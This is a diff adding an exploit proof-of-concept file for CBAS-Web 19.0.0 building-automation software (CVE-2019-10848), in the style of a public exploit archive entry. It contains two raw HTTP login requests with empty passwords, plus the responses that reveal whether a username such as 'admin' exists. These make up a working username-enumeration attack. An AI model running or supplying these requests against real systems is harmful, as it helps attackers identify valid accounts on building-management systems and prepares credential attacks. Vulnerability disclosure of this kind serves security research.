@@ -1,0 +1,35 @@
+# Exploit Title: CBAS-Web 19.0.0 - Username Enumeration
+# Google Dork: NA
+# Date: 2019-11-11
+# Exploit Author: LiquidWorm
+# Vendor Homepage: https://www.computrols.com/capabilities-cbas-web/
+# Software Link: https://www.computrols.com/building-automation-software/
+# Version: 19.0.0
+# Tested on: NA
+# CVE : CVE-2019-10848
+# Advisory: https://applied-risk.com/resources/ar-2019-009
+# Paper: https://applied-risk.com/resources/i-own-your-building-management-system
+
+# Testing for non-valid user:
+
+POST /cbas/index.php?m=auth&a=login HTTP/1.1
+
+username=randomuser&password=&challenge=60753c1b5e449de80e21472b5911594d&response=e16371917371b8b70529737813840c62
+
+# Response for non-valid user:
+
+<!-- Failed login comments appear here -->
+<p class="alert-error">randomuser</p>
+
+========================================================================
+
+Testing for valid user:
+
+POST /cbas/index.php?m=auth&a=login HTTP/1.1
+
+username=admin&password=&challenge=6e4344e7ac62520dba82d7f20ccbd422&response=e09aab669572a8e4576206d5c14befc5s
+
+# Response for valid user:
+
+<!-- Failed login comments appear here -->
+<p class="alert-error">Invalid username/password combination.  Please try again!</p>
